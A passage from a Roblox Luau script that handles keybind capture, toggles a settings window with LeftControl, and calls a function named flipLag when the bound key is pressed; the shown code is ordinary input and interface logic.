    if kc == Enum.KeyCode.Unknown then return end
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
    local isGp = isGamepadKeyCode(kc)

    if listeningForInput then
        local newKey = nil
        if listeningForInput == "kb" and isKb and not BLACKLISTED[kc] then
            newKey = kc.Name
        elseif listeningForInput == "gp" and isGp then
            newKey = kc.Name
        end
        if newKey then
            if listeningForInput == "kb" then
                cfg.keybindKb = newKey
            else
                cfg.keybindGp = newKey
            end
            listeningForInput = false
            if keybindRow then
                local display = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
                keybindRow.Text = display
                keybindRow.BackgroundColor3 = whiteColor
                keybindRow.TextColor3 = blackColor
            end
            saveConfig()
        end
        return
    end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then
            if settingsOpen then toggleSettings() end
        end
        return
    end

    local kbEnum = Enum.KeyCode[cfg.keybindKb]
    local gpEnum = Enum.KeyCode[cfg.keybindGp]
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

task.wait(0.5)
applySelectedImage()
updateToggleButton()